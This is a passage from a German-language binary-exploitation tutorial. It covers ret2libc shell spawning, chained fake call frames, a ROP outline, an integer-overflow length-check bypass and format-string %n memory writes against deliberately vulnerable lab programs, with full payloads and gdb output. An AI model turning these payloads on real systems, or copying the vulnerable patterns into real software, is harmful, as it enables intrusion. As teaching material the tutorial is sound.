Wie es aussieht, befindet sich ein /bin/sh schon direkt im Speicher, manchmal kann das jedoch fehlschlagen.
Dann muss man sich die Adresse selber berechnen, wie das funktioniert zeige ich hier:

Suche offset in libC:
strings -a -t x /lib/i386-linux-gnu/libc-2.23.so | grep "/bin/sh"
 15b9ab /bin/sh

Nun berechnen wir: Basis Adresse libC + offset = 0xf7dfb000 + 0x15b9ab = 0xf7f569ab

Jetzt haben wir also die Adresse von system() und unseren gewünschten Parameter, wir passen unseren alten Payload an.

Payload => gdb --args vuln2 $(python -c "print 'A'*32 + '\xa0\x5d\xe3\xf7' + 'BBBB' '\xab\x69\xf5\xf7'")

Starte Payload:
(gdb) run
Starting program: /home/vuln2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�\]��BBBB�i��
$ uname -a
Linux dontknowme 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
$ exit

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

Fazit:
Obwohl der Stack nicht executable ist, haben wir es trotzdem geschafft eine Shell zu droppen dank libC.

Aufgabe 2:
Nachdem der Payload ausgeführt wurde, gibt es einen Segmentation fault.
Deine Aufgabe ist nun, das Programm sauber zu beenden z.B. mithilfe von exit() in libC.
Hint: exit() braucht keine Parameter.

Verketten von Calling Frames:
Was passiert, wenn wir 2xadd(a,b) aufrufen wollen nacheinander oder wir rufen 2 Funktionen aus der libC nacheinander auf?
Wir erinnern uns daran, das wenn eine Funktion aufgerufen wird, der Stack aufgeräumt werden muss.
Dafür gibt es die Aufrufkonvention cdecl, da wir nur ein "Fake Calling Frame" erstellt haben, müssen wir das selber machen.
Ich habe zur Demonstration eine help() Funktion geschrieben, die uns 2 Werte vom Stack nimmt, damit wir add(a,b) erneut aufrufen können.

Beispiel 4 -> test3.c:

#include <string.h>
#include <stdio.h>

void help()
{
   __asm__(
   "pop %eax;"
   "pop %ebx;"
   );
}

void add(int a, int b)
{
    printf("Ergebnis: %d = %d + %d\n",(a+b),a,b);
}

void foo(char *bar)
{
   char buffer[20];
   strcpy(buffer,bar);
}

int main(int argc, char *argv[])
{
  foo(argv[1]);

  return 0;
}

Kompilieren (Ohne "-z execstack" => Nun ist DEP aktiviert):
gcc test3.c -o vuln4 -g -m32 -fno-stack-protector -no-pie

Da sich an unserer angreifbaren Funtkion foo() nichts geändert hat, können wir wie vorher auch unseren Payload verwenden.

Konstruiere Payload:
1  Overflow Buffer mit 32 A's

add -> 1 Aufruf:
2. Parameter b = 572662306 in Hex 0x22222222 bzw. '\x22\x22\x22\x22'
3. Parameter a = 286331153 in Hex 0x11111111 bzw. '\x11\x11\x11\x11'

add -> 2 Aufruf: 
4. Parameter b = 858993459 in Hex 0x33333333 bzw. '\x33\x33\x33\x33'
5. Parameter a = 1145324612 in Hex 0x44444444 bzw. '\x44\x44\x44\x44'

6. Suche Adresse von help() und add(a,b):
gdb --args vuln4 AAAAAAAAAA
(gdb) break main
Haltepunkt 1 at 0x8048496: file test3.c, line 25.
(gdb) run
Starting program: /home/vuln4 AAAAAAAAAA

Breakpoint 1, main (argc=2, argv=0xffffd014) at test3.c:25
25        foo(argv[1]);
(gdb) p help
$1 = {void ()} 0x804843b <help>
(gdb) p add
$2 = {void (int, int)} 0x8048443 <add>

help = 0x804843b => 0x3b840408 => '\x3b\x84\x04\x08'
add  = 0x8048443 => 0x43840408 => '\x43\x84\x04\x08'

Wie soll der Stack Frame aussehen?

Stackframe foo() + Informationen zum Aufruf von foo()

Bytes : Kontrollfluss

        -------------
  4     | b         | => Der Parameter b von add => Hier würde der Wert 858993459 stehen.               | => Fake calling Frame 2 Teil 1
        |-----------|
  4     | a         | => Der Parameter a von add => Hier würde der Wert 1145324612 stehen.              | => Fake calling Frame 2 Teil 2
        |-----------|
  4     |   CCCC    | => Der "saved eip" verweißt auf CCCC die nach add ausgeführt wird.                | => Fake calling Frame 2 Teil 3 
        |-----------|
  4     | *add      | => Die Adresse verweist auf add (2. Auruf)
        |-----------|
  4     | b         | => Der Parameter b von add => Hier würde der Wert 572662306 stehen.               | => Fake calling Frame 1 Teil 1
        |-----------|
  4     | a         | => Der Parameter a von add => Hier würde der Wert 286331153 stehen.               | => Fake calling Frame 1 Teil 2
        |-----------|
  4     | *help     | => Der "saved eip" verweißt auf die help() Funktion die nach add ausgeführt wird. | => Fake calling Frame 1 Teil 3
        |-----------| 
  4     | *add      | => Die Rücksprungsadresse von foo(argv[1]) verweist nun auf add (1. Aufruf)
        |-----------|
  4     |   AAAA    | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame (main) verweist.
        |-----------|
  20    |A.........A| <-- esp (Verweist auf den Ende des Stacks) => Die lokale Variable -> Buffer => hier würden eigentlich "maximal" 20 "Zufällige" Werte stehen.|
        -------------

=> Payload => gdb --args vuln4 $(python -c "print 'A'*32 + '\x43\x84\x04\x08' + '\x3b\x84\x04\x08' + '\x11\x11\x11\x11' + '\x22\x22\x22\x22' + '\x43\x84\x04\x08' + 'CCCC' + '\x44\x44\x44\x44' + '\x33\x33\x33\x33'")

Starte Payload:
(gdb) run
Starting program: /home/vuln4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\;\"\"\"\"CCCCCDDDD3333
Ergebnis: 858993459 = 286331153 + 572662306
Ergebnis: 2004318071 = 1145324612 + 858993459

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()

Fazit:
Das sieht ziemlich kompliziert aus, was ist wenn keine help() Funktion existiert => Suche gewünschte Instruktion in libC? 
Was passiert wenn wir system() oder andere Exploit relevanten Funktionen aus der libC entfernen?

=> Dafür gibt es ROP :)

5.3 Return-oriented-Programming (ROP):
Wir können "Turing-vollständig" Exploits bzw. Payloads bauen, also können wir alles machen was wir machen wollen.
Die Idee ist komplexe Sequenzen in einfache Sequenzen bzw. Instruktionen (Gadgets) aufzuteilen, die jeweils mit einen ret enden.
Dafür manipulieren wir den Aufrufstack, wie gehabt und verketten einfach unsere Gadgets auf den Stack zu einer ROP-Chain durch ret.
Das basiert natürlich alles auf Code welcher sich schon im Speicher befindet.

Beispiel ROP-Chaining:
Gadget 1 => pop eax, ret
Gadget 2 => pop ebx, ret
Gadget 3 => lea eax, [ebx+eax], ret    

Stackframe foo() + Informationen zum Aufruf von foo()

Bytes : Kontrollfluss

        -------------
  4     | 43434343  |  
        |-----------|
  8     |    3      | 
        |-----------|
  4     | 42424242  |  
        |-----------| 
  8     |    2      |  
        |-----------|
  4     | 41414141  | 
        |-----------|
  8     |    1      | <-- saved eip verweist auf Gadget A.
        |-----------|
  4     |   AAAA    | <-- ebp
        |-----------|
  20    |A.........A| <-- esp 
        -------------
  
Gadget 1 => Lädt 41414141 in eax, ret => nimmt nächste Adresse vom Stack (Gadget B)
Gadget 2 => Lädt 42424242 in ebx, ret => nimmt nächste Adresse vom Stack (Gadget C)
Gadget 3 => Lädt in eax: [ebx+eax], ret => verweist auf CCCC => Segmentation fault.

=> Dazu später mehr.

6. Integer Over/Underflow:
Ein Integer und andere Datentypen haben einen maxi/minimalen Bereich welchen sie darstellen können.

Auf x86 (32 Bit) wäre das für INT:
The minimum value of INT = -2147483648
The maximum value of INT = 2147483647

Was passiert wenn wir diese über/unterschreiten?

Beispiel 5 -> test4.c:
#include <stdio.h>
#include <limits.h>

int main(int argc, char *argv[])
{
    printf("The minimum value of INT = %d\n", INT_MIN);
    printf("The maximum value of INT = %d\n", INT_MAX);
    int a = INT_MAX;
    int b = 1;
    int c = a+b;
    printf("Overflowed value c = %d = %d + %d\n",c,a,b);
    
    int x = INT_MIN;
    int y = -1;
    int z = x+y;
    printf("Underflowed value z = %d = %d + %d\n",z,x,y);
    return 0;
}

Kompilieren (mit allen checks):
gcc test4.c -o vuln5 -g -m32

Was passiert wenn ich z.B. den maximalen Wert überschreite,  also INT_MAX + 1? => Integer Overflow
Was passiert wenn ich z.B. den minimalen Wert unterschreite, also INT_MIN + -1? => Integer Underflow

=> ./vuln5 ausführen

The minimum value of INT = -2147483648
The maximum value of INT = 2147483647
Overflowed value c = -2147483648 = 2147483647 + 1
Underflowed value z = 2147483647 = -2147483648 + -1

Wie man erkennen kann: INT_MAX + 1 = INT_MIN => Overflow oder INT_MIN - 1 = INT_MAX => Underflow

Was bringt uns das jetzt?
Man könnte mit diesen "Angriff" z.B. Memory Leaks finden oder ein Bufferoverflow check umgehen.

Beispiel 6 -> test5.c:
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void foo(char *bar,int a,int b)
{
   char buffer[20];
   
   int c = a+b;
   if(c < 20 && (a >= 0 && b >= 0))
   {
       printf("a=%d and b=%d\n",a,b);
       printf("c = a+b = %d is smaller than 20\n",c);
       printf("Copy %d bytes to buffer with size: %d\n",b,20);
       strncpy(buffer,bar,b);
   }
   else
   {
       printf("Don't copy because a+b >= 20\n");
   }
}

int main(int argc, char *argv[])
{
  if(argc < 4)
  {
      printf("Need 3 arguments\n");
      return -1;
  }
  foo(argv[1],atoi(argv[2]),atoi(argv[3]));
  return 0;
} 

Kompilieren:
gcc test5.c -o vuln6 -g -m32 -fno-stack-protector -z execstack -no-pie

Konstruiere Payload:
In Beispiel 6 werden maximal 19 Bytes kopiert, da a+b > 20 und a/b dürfen beide nicht < 0 sein.
Sonst könnte man z.B. a=-5000 und b = 4000 machen => a+b = -1000 < 20.
Wir müssen uns hier was anderes überlegen z.B. ein Integer Overflow.

Ein Exploit könnte z.B. so aussehen:
a = 2147483647    => a >= 0
b = 200           => b >= 0
a+b = -2147483648 < 20 

=> Copy 200  bytes to buffer with size: 20 => Bufferoverflow

=> Payload: gdb --args vuln6 $(python -c "print 'A'*36 + 'B'*4") 2147483647 40

Starte Payload:
(gdb) run
Starting program: /home/vuln6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB 2147483647 40
a=2147483647 and b=40
c = a+b = -2147483609 is smaller than 20
Copy 40 bytes to buffer with size: 20

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

Fazit:
Wir konnten also die Prüfung der Eingabelänge für unseren Buffer umgehen und beliebig viele Bytes in den Buffer bzw. auf unseren Stack bringen.
=> eip wurde mit "BBBB" überschrieben.

7. Format String Angriffe:
Es ist möglich die "printf"-Familie zu exploiten, das funktioniert wenn keine Format-Strings bei der printf-Funktion angegeben werden.
Mit dieser Art von Angriff ist es möglich Speicher auszulesen und sogar den Kontrollfluss zu manipulieren.

Unser Ziel ist es den Wert von value von 47 auf 9988 zu verändern!

Beispiel 7 -> test6.c:
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char buffer[1024];
    static int value = 47;
    
    if(argc != 2)
        return -1;
        
    strcpy(buffer,argv[1]);
    
    printf(buffer);
    printf("\n");
    printf("value @ 0x%08x = %d 0x%08x\n",&value, value, value);
    
    if(value == 9988)
    {
        printf("Value is = %d How did you get there?\n",value);
    }
    
    return 0;
} 

Kompilieren:
gcc test6.c -o vuln7 -g -m32 -fno-stack-protector -z execstack -no-pie

Die Format-String Schwachstelle befindet sich an dieser Stelle:

=> printf(buffer);

Warum?
Buffer wird von uns kontrolliert, was letztendlich unser argv[1] ist.
Was passiert wenn wir z.B. ./vuln7 "AAAA %x %x %x %x" aufrufen?

Somit würde in der Zeile folgendes stehen:
=> printf("AAAA %x %x %x %x");

Die Funktion printf würde also die ersten 4 Werte "vom Stack nehmen" und ausgeben => Memory Leak.

Um das Prinzip dahinter genau zu verstehen, schauen wir uns einmal den Stack Frame von main() bis zu der Zeile => printf(buffer); an.


Stackframe main() + Informationen zum Aufruf von main()

Bytes : Kontrollfluss

        -------------
  4     |*args      | => Die Argumente von main() => "AAAA %x %x %x %x"
        |-----------|
  4     | saved eip | => Die Rücksprungsadresse von main()
        |-----------|
  4     | saved ebp | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame verweist.
        |-----------|
  1024  | buffer    | <-- esp (Verweist auf den Ende des Stacks) => Die lokale Variable -> Buffer => hier würden eigentlich "maximal" 1024 "Zufällige" Werte stehen.|
        -------------

Was passiert nun, wenn printf(buffer); aufgerufen wird?
Erstmal wird der Stack Frame für printf() aufgebaut, der direkt unterhalb von main() liegt:

Stackframe main() + Informationen zum Aufruf von main() + Stackframe printf() + Informationen zum Aufruf von printf():

Bytes : Kontrollfluss

        -------------
  4     |*args      | => Die Argumente von main() => "AAAA %x %x %x %x"
        |-----------|
  4     | saved eip | => Die Rücksprungsadresse von main()
        |-----------|
  4     | saved ebp | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame (main) verweist.
        |-----------|
  1024  | buffer    | Die lokale Variable -> Buffer => hier würden eigentlich "maximal" 1024 "Zufällige" Werte stehen => "AAAA %x %x %x %x" steht am Ende.
  
Stackframe => printf()
        |-----------|
  4     |*args      | => Die Argumente von printf() => "AAAA %x %x %x"
        |-----------| 
  4     | saved eip | => Die Rücksprungsadresse von printf() zu main()
        |-----------|
  4     | saved ebp | <-- ebp (Verweist auf den Anfang des Stack Frames) => Der alte Base Pointer, welcher auf den vorherigen Stack Frame (main) verweist.
        |-----------|

Wenn wir nun den Aufruf von oben => printf("AAAA %x %x %x %x"), geht printf() nach oben und gibt theoretisch den "saved ebp", "saved eip", "*args" 
und die ersten 4 Bytes vom Ende des Buffer aus.

./vuln7 "AAAA %x %x %x %x"

Output:
AAAA ffffd180 1af23c 1b023c 41414141
value @ 0x0804a024 = 47 0x0000002f     <-- Unser Programm ist so nett und gibt uns die Adresse von value aus.

Das bedeutet wir können beliebige Werte auf den Stack schmeißen und mit "%x" ausgeben lassen.
Was bringt uns das, bis auf die Memory Leaks?
Das nette ist, es existiert der Format Parameter => "%n".
Mit diesen Parameter schreibt man an eine Speicheradresse soviele Bytes wie man schon ausgegeben hat.

Beispiel:
#include <stdio.h>

int main(int argc, char *argv[])
{
    int x = 0;
    printf("Hallo%n", &x);
    printf("%d",x);
} 

Hallo ist 5 Bytes lang, "%n" überschreibt also die Variable x mit den Wert 5.
Wichtig ist das &x zu beachten, "%n" verlangt eine Adresse und kein Wert.

=> Wir schieben also die Speicheradresse von value auf den Stack (&value) und suchen solange mit "%x" bis wir die Adresse gefunden haben.
Sobald wir diese Adresse von unseren Buffer ausgeben lassen, verwenden wir "%n" um diesen Wert zu verändern.


Konstruiere und starte Payload:

1. Suche die Adresse der zu überschreibenen Variable:
Hier wurde diese gegeben mit: 0x0804a024 in Little Endian => 0x24a00408 bzw. '\x24\xa0\x04\x08'

Oder wir suchen sie einfach in gdb:
gdb --args vuln7 "whatDaFuck"

(gdb) break main
Haltepunkt 1 at 0x8048491: file test6.c, line 9.
(gdb) run
Starting program: /home/vuln7 whatDaFuck

Breakpoint 1, main (argc=2, argv=0xffffcf94) at test6.c:9
9           if(argc != 2)
(gdb) p &value
$1 = (int *) 0x804a024 <value>

2. Packe die gesuchte Adresse auf den Stack und wiederhole "%x" bis diese Adresse gefunden wurde.

Adresse von value = 0x804a024 in Little Endian => 0x24a00408 bzw. '\x24\xa0\x04\x08'

./vuln7 "$(python -c "print 'AAAA' + '\x24\xa0\x04\x08' + 'BBBB'+ ' %x '*10")"

Output:
AAAA$BBBB ffffd1a9  1af23c  1b023c  41414141  804a024  42424242  20782520  20782520  20782520  20782520 
value @ 0x0804a024 = 47 0x0000002f

Ich füge vor der Speicheradresse 'AAAA' und nach der Speicheradresse 'BBBB' hinzu, um die Adresse besser zu finden.
Das kann auch wegelassen werden, dann muss man Logischerweise 1x '%x' weniger verwenden.

Vorsichtig mit 'AAAA ' => Zusätzliches Leerzeichen, das verändert das Alignment im Speicher und dann lässt sich die Adresse nicht mehr so leicht überschreiben.

./vuln7 "$(python -c "print 'AAAA' + '\x24\xa0\x04\x08' + 'BBBB'+ ' %x '*4")"

Output:
AAAA$BBBB ffffd1c1  1af23c  1b023c  41414141 
value @ 0x0804a024 = 47 0x0000002f

Der nächste Wert, wäre jetzt unsere gesuchte Speicheradresse von value.
Nun verwenden wir "%n" und überschreiben den Wert an der Adresse.

./vuln7 "$(python -c "print 'AAAA' + '\x24\xa0\x04\x08' + 'BBBB'+ ' %x '*4 + '%n'")"

Output:
AAAA$BBBB ffffd1bf  1af23c  1b023c  41414141 
value @ 0x0804a024 = 48 0x00000030

Perfekt wir haben den Wert von value von 47 auf 48 geändert, aber wir brauchen noch 9988 - 48 = 9940 Werte.
Unser Buffer hat aber höchstens 1024 Werte => D.h wir können nicht einfach 9940 Werte auf den Buffer jagen.

Die Lösung unseres Problems => Padding.
Wenn ich z.B. den Format Parameter "%20x" verwende, werden vor der Ausgabe 20 Leerzeichen mit ausgegeben.
Es spielt keine Rolle wie groß in diesen Moment der Buffer ist, da printf() das intern anders verwaltet.

=> ./vuln7 "$(python -c "print 'AAAA' + '\x24\xa0\x04\x08' + 'BBBB'+ ' %x '*3 + '%9940x' + '%n'")"

Output: Nach unzähligen Leerzeichen
value @ 0x0804a024 = 9978 0x000026fa

In der Praxis brauchen wir also noch 10 mehr, kein Problem:

Payload => ./vuln7 "$(python -c "print 'AAAA' + '\x24\xa0\x04\x08' + 'BBBB'+ ' %x '*3 + '%9950x' + '%n'")"

Output:
value @ 0x0804a024 = 9988 0x00002704
Value is = 9988 How did you get there?

Schön jetzt haben wir immerhin den Wert einer Variabel verändert, können wir auch eine Rücksprungsadresse überschreiben?
=> Natürlich wir können alle Adressen überschreiben auf die wir Zugriff haben.

Konstruiere Payload um den eip zu überschreiben:

1. Suche die Adresse, an der der saved eip liegt.

2. Packe die gesuchte Adresse auf den Stack und wiederhole "%x" bis diese Adresse gefunden wurde.

3. Überschreibe die Speicheradresse (mit Padding):

Was brauchen wir hier für ein Padding?

Eip Adresse ist z.B. 0xffffcefc in Dezimal => 4294954748

Padding = 4294954748 - (bereits ausgegeben) = Verdammt viel!

./vuln7 "$(python -c "print 'AAAA' + '\xfc\xce\xff\xff' + 'BBBB'+ ' %x '*3" + '%VERDAMT VIEL PADDINGx' + '%n')"

Es gibt mehrere Möglichkeiten das Problem zu umgehen, die Adresse besteht aus 4 Bytes.
Man könnte z.B. jedes Bytes der Adresse einzeln überschreiben, also bräuchte man pro Byte maximal (2^8)-1 also 255 Werte.

Beispiel: 0xffffcefc => 

Adresse 1: 0xff = 255 
Adresse 2: 0xff = 255
Adresse 3: 0xce = 206
Adresse 4: 0xfc = 252

=> Push die Adressen 1-4 auf den Stack und Überschreibe jedes Byte der Adresse Bytesweise.
=> Dazu später mehr.


Fazit:
Wir können mit Format String Schwachstellen beliebige Werte verändern und zusätzlich den Kontrollfluss.
Leider findet man nur noch selten diese Art von Schwachstelle, da man diese ziemlich in einer Source-Code Analyse finden kann.

ENDE!


//Todo
a. Heap Overflow:
b. User-after Free:
c. Race Conditions:
